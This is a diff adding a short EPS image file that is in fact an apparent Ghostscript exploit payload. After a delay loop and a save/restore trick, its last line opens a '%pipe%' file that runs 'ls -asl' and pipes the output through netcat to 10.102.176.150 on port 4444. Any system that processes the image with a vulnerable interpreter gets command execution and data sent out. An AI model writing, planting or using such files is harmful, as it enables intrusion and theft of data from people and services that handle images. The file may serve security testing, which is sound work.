@@ -1,0 +1,5 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+0 1 300367 {} for
+{save restore} stopped {} if
+(%pipe%ls -asl | nc 10.102.176.150 4444) (w) file
